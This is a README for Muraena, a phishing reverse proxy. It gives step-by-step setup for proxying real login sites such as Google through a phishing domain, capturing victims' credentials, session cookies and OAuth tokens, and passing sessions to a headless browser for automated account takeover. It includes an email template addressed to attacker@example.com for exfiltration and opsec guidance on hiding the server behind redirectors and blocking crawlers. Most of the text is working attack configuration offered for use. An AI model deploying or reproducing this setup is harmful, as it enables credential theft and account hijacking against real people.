<p align="center">
  <img alt="Muraena Logo" src="./media/img/muraena_logo.png" height="160" /><br>
	<p align="center">
    <a href="https://github.com/muraenateam/muraena/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/muraenateam/muraena.svg?style=flat-square"></a>
    <a href="https://github.com/muraenateam/muraena/blob/master/LICENSE.md"><img alt="Software License" src="https://img.shields.io/badge/license-BSD3-brightgreen.svg?style=flat-square"></a>
    <a href="https://goreportcard.com/report/github.com/muraenateam/muraena"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/muraenateam/muraena?style=flat-square&fuckgithubcache=1"></a>
    </p>

**Muraena** is an almost-transparent reverse proxy for automating phishing and post-phishing activities. It proxies a legitimate site through your phishing domain, capturing credentials, session cookies, and OAuth tokens in real time — and can automatically hand captured sessions off to [Necrobrowser-NG](https://github.com/muraenateam/necrobrowser) for headless browser automation.

---

## Table of Contents

1. [Requirements](#requirements)
2. [Quick Start](#quick-start)
3. [Setup Wizard — Full Walkthrough](#setup-wizard--full-walkthrough)
   - [Core config](#1-core-config)
   - [Redirector / opsec](#2-redirector--opsec)
   - [TLS / HTTPS](#3-tls--https)
   - [Tracking](#4-tracking)
   - [Session handling](#5-session-handling)
   - [Telegram alerts](#6-telegram-alerts)
4. [After Setup](#after-setup)
5. [Manual Install (no Docker)](#manual-install-no-docker)
6. [Redirector Setup (opsec)](#redirector-setup-opsec)
7. [TLS Reference](#tls-reference)
8. [OAuth / Token Capture](#oauth--token-capture)
9. [Manual Cookie Injection](#manual-cookie-injection)
10. [Configuration Reference](#configuration-reference)
11. [Module Guides](#module-guides)
12. [Monitoring & Redis](#monitoring--redis)
13. [CI / Automation Mode](#ci--automation-mode)
14. [Makefile Commands](#makefile-commands)
15. [Troubleshooting](#troubleshooting)

---

## Requirements

| Requirement | Notes |
|---|---|
| VPS with a public IP | Tested on Debian/Ubuntu; also works on RHEL/Alpine |
| Domain with A record pointing at the VPS | Required before running Let's Encrypt |
| Docker + Docker Compose v2 | `docker compose version` must work |
| `git`, `curl`, `openssl` | Usually pre-installed |
| Root / sudo | `setup.sh` requires root to configure TLS and firewall |

> **Redirector mode:** If you want to hide Muraena's IP (recommended), you need a second cheap VPS. Its IP goes in DNS; it forwards traffic to Muraena. See [Redirector Setup](#redirector-setup-opsec).

---

## Quick Start

```bash
git clone https://github.com/5l33m/muraena.git
cd muraena
sudo ./setup.sh
```

The wizard asks ~10 questions and handles everything: firewall, TLS certificates, auto-renewal, config generation, Necrobrowser-NG cloning (optional), and container launch.

---

## Setup Wizard — Full Walkthrough

Run `sudo ./setup.sh`. Here is every prompt, what it means, and what to enter.

### 1. Core config

```
Phishing domain (e.g. evil.example.com): login.yourfakepage.com
Target domain to proxy (e.g. accounts.google.com): accounts.google.com
```

- **Phishing domain** — the domain you own and have pointed at this server (or at your redirector). This is what victims visit.
- **Target domain** — the real site you are proxying. Muraena will fetch content from here and rewrite all references.

The wizard immediately resolves your phishing domain and compares it to the server's public IP. If they don't match it warns you (expected when using a redirector).

---

### 2. Redirector / opsec

```
Use a redirector VPS? [y/N]: y
Redirector VPS IP address: 1.2.3.4
Redirector type [1/2]:
  1) nginx  (TCP stream proxy — recommended)
  2) socat  (simple port forwarder)
```

- **Redirector** — a cheap second VPS. DNS points to it; it TCP-forwards traffic to Muraena. If the domain gets burned you replace the redirector, not Muraena.
- **nginx** — preferred. Uses `stream {}` block to forward TCP at layer 4 (TLS stays encrypted through the redirector; Muraena decrypts it).
- **socat** — simpler, no config files needed.

The wizard writes ready-to-deploy configs to `config/redirector/` and locks the firewall so ports 80/443 only accept connections from the redirector IP.

> Skip this prompt (`N`) if you are testing locally or don't need opsec yet.

---

### 3. TLS / HTTPS

```
  1) Let's Encrypt — HTTP-01  (needs port 80 open, no redirector)
  2) Let's Encrypt — DNS-01   (needs DNS API or manual TXT record)
  3) Self-signed              (testing / LAN)
  4) None                     (plain HTTP, port 8080)
Choose [1/2/3/4]:
```

| Option | When to use |
|---|---|
| **1 — HTTP-01** | Standard deploy, no redirector, port 80 reachable from internet |
| **2 — DNS-01** | Required when using a redirector (port 80 not public), or wildcard certs |
| **3 — Self-signed** | Local testing; browsers will show a warning |
| **4 — None** | HTTP only on port 8080; for development |

If you choose **DNS-01**, the wizard asks your DNS provider:

```
  1) Cloudflare (automatic)
  2) Route53    (automatic — needs AWS credentials in env)
  3) Manual     (you add the TXT record yourself)
Choose [1/2/3]:
```

- **Cloudflare**: enter your API token (Zone > DNS > Edit permission). Fully automatic.
- **Route53**: set `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` in your environment before running. Fully automatic.
- **Manual**: certbot pauses and asks you to add `_acme-challenge.<domain>` TXT records to your DNS.

Let's Encrypt certs auto-renew via a cron job installed at `/etc/cron.d/muraena-certbot-renew`. On renewal, certs are copied to `config/` and Muraena restarts automatically.

---

### 4. Tracking

```
Enable victim tracking? [Y/n]: Y
Enable OAuth/bearer token capture? [y/N]: y
```

- **Victim tracking** — tracks each visitor with a unique ID (`_uid` query param or cookie). Required to capture credentials.
- **OAuth/bearer token capture** — scans JSON response bodies for `access_token`, `refresh_token`, `id_token`, etc., and captures `Authorization: Bearer` headers from requests. Useful for Microsoft 365, Google Workspace, GitHub, and similar OAuth-based targets.

---

### 5. Session handling

```
  1) Store only     — save to Redis; inspect with redis-cli
  2) Store + send   — Redis + Necrobrowser-NG in Docker (auto-cloned)
  3) Store + send   — Redis + existing Necrobrowser-NG instance
Choose [1/2/3] (default: 1):
```

| Option | What happens when a victim authenticates |
|---|---|
| **1** | Cookies and credentials saved to Redis. You inspect manually. |
| **2** | Same as 1 + Necrobrowser-NG cloned and started in Docker. Sessions auto-forwarded when trigger cookies appear. |
| **3** | Same as 2, but you supply the URL of an already-running Necrobrowser-NG. |

If you choose 2 or 3:

```
Trigger cookie name(s) (comma-separated): sessionToken,ESAUTHENTICATED
Task type (office365/github/generic): office365
Necrobrowser-NG endpoint URL:          # only for option 3
```

- **Trigger cookies** — Muraena polls Redis every 10 seconds; when all named cookies are present it POSTs the session to Necrobrowser.
- **Task type** — controls which Necrobrowser task template is used. Edit `config/instrument.necro` after setup for full control.

---

### 6. Telegram alerts

```
Enable Telegram alerts? [y/N]: y
Bot token: 1587304999:AAG4cH8V...
Chat ID (e.g. -1001234567890): -1001856562703
```

Get a bot token from [@BotFather](https://t.me/BotFather). Get your chat ID by sending a message to the bot then calling `GET https://api.telegram.org/bot<TOKEN>/getUpdates`.

---

## After Setup

When the wizard finishes you see:

```
[+] Muraena is running!

  Phishing domain : login.yourfakepage.com
  Proxying        : accounts.google.com
  URL             : https://login.yourfakepage.com
  Sessions        : Redis + Necrobrowser-NG (Docker)
  Redirector      : 1.2.3.4 (nginx) — see config/redirector/

  Inspect Redis   : docker compose exec redis redis-cli hgetall victim:<ID>
  Logs            : docker compose logs -f muraena
  Stop            : docker compose down
```

Send victims to your phishing URL with the tracking parameter:

```
https://login.yourfakepage.com/?_uid=CAMPAIGN_01
```

Every request from that browser session is tagged with `CAMPAIGN_01`. Captured credentials and cookies are stored in Redis under `victim:CAMPAIGN_01`.

---

## Manual Install (no Docker)

```bash
# 1. Install Go 1.22+
go version   # must print go1.22 or later

# 2. Install and start Redis
sudo apt-get install -y redis-server
sudo systemctl start redis

# 3. Clone and build
git clone https://github.com/5l33m/muraena.git
cd muraena
go build -o muraena .

# 4. Place TLS certs (see TLS Reference below)
# config/cert.pem, config/privkey.pem, config/fullchain.pem

# 5. Edit config (change phishing/destination at minimum)
cp config/config.toml config/config.local.toml
$EDITOR config/config.local.toml

# 6. Run
./muraena -config config/config.local.toml
```

When running manually, set `redis.host = "127.0.0.1"` (not `"redis"`).

---

## Redirector Setup (opsec)

A redirector hides Muraena's real IP. The flow is:

```
Victim → [Redirector VPS — DNS A record here] → [Muraena VPS — IP never exposed]
```

### What setup.sh generates

After choosing a redirector during setup, `config/redirector/` contains:

**`nginx.conf`** — copy to `/etc/nginx/nginx.conf` on your redirector VPS:

```nginx
stream {
    server {
        listen     443;
        proxy_pass <MURAENA_IP>:443;
        proxy_timeout 600s;
    }
    server {
        listen     80;
        proxy_pass <MURAENA_IP>:80;
    }
}
```

This is a **TCP-level** pass-through. The TLS handshake happens at Muraena, not the redirector — so the redirector never sees plaintext and you only manage one certificate.

**`socat-redirector.sh`** — if you chose socat, run this on the redirector:

```bash
scp config/redirector/socat-redirector.sh root@REDIRECTOR_VPS:/tmp/
ssh root@REDIRECTOR_VPS bash /tmp/socat-redirector.sh
```

### Opsec checklist

- DNS A record for your phishing domain → **redirector IP** (not Muraena)
- Muraena firewall allows 80/443 **only from redirector IP** (setup.sh does this automatically)
- Never reference Muraena's IP in emails, certificates, or logs
- Use **DNS-01** for Let's Encrypt (HTTP-01 would expose port 80 on the Muraena VPS)
- If the redirector IP gets burned: spin up a new VPS, re-run the setup script on it, update DNS — Muraena stays untouched

---

## TLS Reference

All three TLS files live in `config/`:

| File | Content |
|---|---|
| `config/cert.pem` | Domain certificate |
| `config/privkey.pem` | Private key |
| `config/fullchain.pem` | Full chain (cert + intermediates) |

### Let's Encrypt — manual steps (if not using setup.sh)

```bash
# HTTP-01 (port 80 must be free)
sudo certbot certonly --standalone -d phishing.example.com

# DNS-01 via Cloudflare
sudo certbot certonly \
  --dns-cloudflare \
  --dns-cloudflare-credentials /etc/cloudflare.ini \
  -d phishing.example.com

# Copy to Muraena config
sudo cp /etc/letsencrypt/live/phishing.example.com/cert.pem     config/cert.pem
sudo cp /etc/letsencrypt/live/phishing.example.com/privkey.pem  config/privkey.pem
sudo cp /etc/letsencrypt/live/phishing.example.com/fullchain.pem config/fullchain.pem
```

Auto-renewal cron (installed by setup.sh at `/etc/cron.d/muraena-certbot-renew`):

```cron
0 3,15 * * * root certbot renew --quiet \
  --deploy-hook "cp /etc/letsencrypt/live/DOMAIN/*.pem /opt/muraena/config/ && \
                 docker compose -f /opt/muraena/docker-compose.yml restart muraena"
```

### Disable TLS (HTTP-only, for testing)

```toml
[tls]
    enable = false

[proxy]
    port = 8080

[proxy.HTTPtoHTTPS]
    enable = false
```

---

## OAuth / Token Capture

When **OAuth/bearer token capture** is enabled, Muraena:

1. Scans `Authorization: Bearer <token>` headers in **requests** (captures the token type as `bearer`)
2. Scans **JSON response bodies** from common OAuth endpoints for keys: `access_token`, `refresh_token`, `id_token`, `token`, `bearer_token`

Captured tokens are stored in Redis alongside session cookies and forwarded to Necrobrowser-NG inside the `%%%TOKENS%%%` placeholder.

### Config generated by setup.sh

```toml
[tracking.tokens]
    enable        = true
    captureBearer = true
    keys  = ["access_token", "refresh_token", "id_token", "token", "bearer_token"]
    paths = [
        "/oauth/token", "/oauth2/token", "/token",
        "/api/token",   "/connect/token", "/auth/token",
        "/login/oauth/access_token",
    ]
```

Leave `paths` empty to scan all JSON responses. Add target-specific paths to reduce noise.

### instrument.necro placeholders

```json
{
  "name": "%%%TRACKER%%%",
  "task": {
    "type": "office365",
    "params": {
      "credentials": %%%CREDENTIALS%%%,
      "tokens":      %%%TOKENS%%%
    }
  },
  "cookies": %%%COOKIES%%%
}
```

---

## Manual Cookie Injection

Use `inject-session.py` to manually inject browser-exported cookies into a running Necrobrowser-NG instance (useful for testing or re-playing sessions).

### Prerequisites

```bash
pip3 install tomllib   # Python 3.11+ has it built in
```

Ensure `config/config.toml` has `[necrobrowser] endpoint = "..."` set, or pass `--endpoint`.

### Usage

```bash
# Interactive (paste cookies)
./inject-session.py

# From a file (exported by Cookie-Editor, EditThisCookie, etc.)
./inject-session.py cookies.json

# With credentials and a campaign label
./inject-session.py cookies.json -u admin@corp.com -p 'P@ssw0rd' --tracker campaign-01

# Include OAuth tokens
./inject-session.py cookies.json \
  --token access_token=eyJhbGc... \
  --token refresh_token=eyJhbGc...

# Override endpoint
./inject-session.py cookies.json --endpoint http://10.0.0.2:3000/instrument

# Dry run — print the request body without sending
./inject-session.py cookies.json --dry-run
```

### Cookie file formats

**JSON** (Cookie-Editor / EditThisCookie export):

```json
[
  {
    "name": "sessionToken",
    "value": "abc123",
    "domain": ".example.com",
    "path": "/",
    "secure": true,
    "httpOnly": true,
    "expirationDate": 1700000000
  }
]
```

**Netscape / curl cookie jar** (tab-separated `.txt`):

```
.example.com	TRUE	/	TRUE	1700000000	sessionToken	abc123
```

Both formats are auto-detected.

### Makefile shortcuts

```bash
make inject       # runs inject-session.py interactively
make inject-dry   # dry run (prints body, no network call)
```

---

## Configuration Reference

The full config lives in `config/config.toml`. Key sections:

### `[proxy]`

```toml
[proxy]
    phishing    = "attacker.com"       # Your phishing domain
    destination = "legitimate.com"     # Real site to proxy
    # port      = 443                  # Default: 443 with TLS, 80 without

    [proxy.HTTPtoHTTPS]
        enable   = true
        HTTPport = 80
```

### `[tls]`

```toml
[tls]
    enable      = true
    certificate = "./config/cert.pem"
    key         = "./config/privkey.pem"
    root        = "./config/fullchain.pem"
    minVersion  = "TLS1.2"
    renegotiationSupport = "Never"
    # insecureSkipVerify = false   # set true if target uses self-signed certs
```

### `[tracking]`

```toml
[tracking]
    enable             = true
    trackRequestCookie = true

    [tracking.trace]
        identifier = "_uid"               # Query param / cookie name for tracking ID
        validator  = "[a-zA-Z0-9]{8}"
        [tracking.trace.landing]
            type = "query"                # "query" → ?_uid=TOKEN  |  "path" → /TOKEN/

[tracking.secrets]
    paths = ["/login", "/signin", "/auth"]

    [[tracking.secrets.patterns]]
        label = "Username"
        start = "username="
        end   = "&"

    [[tracking.secrets.patterns]]
        label = "Password"
        start = "password="
        end   = "&"

[tracking.tokens]
    enable        = true
    captureBearer = true
    keys          = ["access_token", "refresh_token", "id_token"]
    paths         = ["/oauth/token", "/api/token"]
```

### `[necrobrowser]`

```toml
[necrobrowser]
    enable   = true
    endpoint = "http://necrobrowser:3000/instrument"
    profile  = "./config/instrument.necro"

    [necrobrowser.trigger]
        type   = "cookies"
        values = ["sessionToken", "ESAUTHENTICATED"]
        delay  = 10              # seconds between Redis polls
```

### `[redis]`

```toml
[redis]
    host     = "redis"      # Use "127.0.0.1" for manual (non-Docker) installs
    port     = 6379
    password = ""
```

### `[telegram]`

```toml
[telegram]
    enable   = true
    botToken = "YOUR_BOT_TOKEN"
    chatIDs  = ["-1001234567890"]
```

---

## Module Guides

### Tracking

Tags each victim with a unique ID and captures form credentials.

Send victims to:

```
https://phishing.example.com/?_uid=CAMPAIGN_ID
```

All requests from that browser get tagged. Captured credentials appear in logs and Redis.

---

### Necrobrowser-NG

Automatically replays captured sessions in a headless browser.

Edit `config/instrument.necro` to control what Necrobrowser does:

```json
{
  "name": "%%%TRACKER%%%",
  "task": {
    "type": "office365",
    "name": ["OutlookWriteEmail"],
    "params": {
      "fixSession": "https://outlook.office.com/mail/inbox",
      "credentials": %%%CREDENTIALS%%%,
      "tokens": %%%TOKENS%%%,
      "writeEmail": {
        "to": "attacker@example.com",
        "subject": "Captured — %%%TRACKER%%%",
        "data": "Auto-exfil via Muraena"
      }
    }
  },
  "cookies": %%%COOKIES%%%
}
```

Placeholders replaced at runtime:

| Placeholder | Replaced with |
|---|---|
| `%%%TRACKER%%%` | Victim's tracking ID |
| `%%%COOKIES%%%` | JSON array of captured cookies |
| `%%%CREDENTIALS%%%` | `{"username":"...","password":"..."}` |
| `%%%TOKENS%%%` | JSON array of captured OAuth tokens |

---

### Watchdog

Block or allow visitors by IP, country, or user-agent.

```toml
[watchdog]
    enable  = true
    dynamic = true
    rules   = "./config/watchdog.rules"
    geoDB   = "./config/geoDB.mmdb"
```

`watchdog.rules` examples:

```
# Block known scanner IPs and ranges
deny ip 192.168.1.100
deny ip 10.0.0.0/8

# Only allow specific countries
allow country US
allow country GB
deny country *

# Block crawlers
deny useragent Googlebot
deny useragent python-requests
```

Download `GeoLite2-City.mmdb` free from [MaxMind](https://dev.maxmind.com/geoip/geolite2-free-geolocation-data).

---

### Login Cloner

Clones a login page (HTML + CSS + JS + images) and rewrites form actions.

```toml
[logincloner]
    enable    = true
    targetUrl = "https://accounts.example.com/login"
    outputDir = "./static/cloned"
```

Pair with `[staticServer]` to serve the cloned page:

```toml
[staticServer]
    enable    = true
    localPath = "./static/cloned"
    urlPath   = "/"
```

---

### Telegram

Real-time alerts for captured credentials and sessions. See setup wizard step 6 above.

---

## Monitoring & Redis

```bash
# Live Muraena logs
docker compose logs -f muraena

# All keys for a victim
docker compose exec redis redis-cli hgetall victim:CAMPAIGN_01

# List all victims
docker compose exec redis redis-cli keys 'victim:*'

# Inspect a specific cookie
docker compose exec redis redis-cli hget victim:CAMPAIGN_01 cookie_sessionToken

# Watch captures in real time
docker compose exec redis redis-cli --scan --pattern 'victim:*' | xargs -I{} docker compose exec redis redis-cli hgetall {}
```

---

## CI / Automation Mode

Run `setup.sh --ci` and set environment variables instead of answering prompts. Useful for VPS provisioning scripts and the included GitHub Actions workflow.

| Variable | Required | Default | Description |
|---|---|---|---|
| `MURAENA_PHISHING_DOMAIN` | yes | — | Your phishing domain |
| `MURAENA_TARGET_DOMAIN` | yes | — | Domain to proxy |
| `MURAENA_TLS_MODE` | no | `4` | `1`=HTTP-01, `2`=DNS-01, `3`=self-signed, `4`=none |
| `MURAENA_DNS_PROVIDER` | when TLS=2 | `manual` | `cloudflare`, `route53`, `manual` |
| `MURAENA_CF_API_TOKEN` | when DNS=cloudflare | — | Cloudflare API token |
| `MURAENA_TRACKING` | no | `true` | Enable tracking |
| `MURAENA_TOKEN_CAPTURE` | no | `false` | Enable OAuth token capture |
| `MURAENA_SESSION_MODE` | no | `1` | `1`=store-only, `2`=necro-docker, `3`=necro-external |
| `MURAENA_NECRO_ENDPOINT` | when mode=3 | — | Necrobrowser-NG URL |
| `MURAENA_NECRO_COOKIES` | no | `sessionToken` | Comma-separated trigger cookie names |
| `MURAENA_NECRO_TASK_TYPE` | no | `generic` | `office365`, `github`, `generic` |
| `MURAENA_REDIRECTOR_IP` | no | — | Redirector VPS IP (triggers opsec firewall rules) |
| `MURAENA_REDIRECTOR_TYPE` | no | `nginx` | `nginx` or `socat` |
| `MURAENA_TELEGRAM_TOKEN` | no | — | Telegram bot token |
| `MURAENA_TELEGRAM_CHAT_ID` | no | — | Telegram chat ID |

Example:

```bash
export MURAENA_PHISHING_DOMAIN=login.yourpage.com
export MURAENA_TARGET_DOMAIN=accounts.google.com
export MURAENA_TLS_MODE=2
export MURAENA_DNS_PROVIDER=cloudflare
export MURAENA_CF_API_TOKEN=your-token-here
export MURAENA_SESSION_MODE=2
export MURAENA_REDIRECTOR_IP=1.2.3.4

sudo ./setup.sh --ci
```

---

## Makefile Commands

```bash
make setup        # run setup.sh
make up           # start Muraena + Redis
make up-full      # start Muraena + Redis + Necrobrowser-NG
make down         # stop all containers
make logs         # tail Muraena logs
make logs-all     # tail all container logs
make build        # compile binary locally (needs Go 1.22+)
make test         # run test suite
make fmt          # gofmt + goimports
make inject       # run inject-session.py interactively
make inject-dry   # dry run (prints body, no network call)
make clean        # remove binary and generated certs
make help         # list all targets
```

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `dial tcp: connection refused` at startup | Redis not running | `docker compose up -d redis` or `sudo systemctl start redis` |
| Let's Encrypt fails with "connection refused" | Port 80 not reachable | Ensure firewall allows port 80, or use DNS-01 |
| DNS check warns about IP mismatch | Domain not yet propagated, or using redirector | With a redirector this is expected — continue |
| `certificate signed by unknown authority` | Self-signed cert | Set `tls.insecureSkipVerify = true` in config |
| `bind: address already in use` | Another process on 443/80 | `sudo lsof -i :443` then kill it or change `proxy.port` |
| Watchdog blocks all traffic | Overly strict rules | Comment out `deny country *` in `watchdog.rules` |
| Necrobrowser never instruments a session | Trigger cookies not appearing | Check Redis: `redis-cli hgetall victim:<ID>` — are trigger cookies present? |
| `Error reading profile file` | Wrong path in `[necrobrowser] profile` | Use absolute path or verify file exists |
| Login cloner produces blank page | JS-rendered content | The cloner captures initial HTML; use a headless browser for SPAs |
| TLS handshake errors | `minVersion` too high | Set `minVersion = "TLS1.0"` temporarily to diagnose |
| Certbot renewal fails | Cron job missing or wrong path | Check `/etc/cron.d/muraena-certbot-renew`; re-run setup.sh to regenerate |
| `inject-session.py` — "profile not found" | `config/instrument.necro` missing | Copy from `config/instrument.necro.example` and edit |

---

## License

**Muraena** is made with ❤️ by [the dev team](https://github.com/orgs/muraenateam/people) and released under the <a href="https://github.com/muraenateam/muraena/blob/master/LICENSE.md"><img alt="Software License" src="https://img.shields.io/badge/license-BSD3-brightgreen.svg?style=flat-square"></a>.
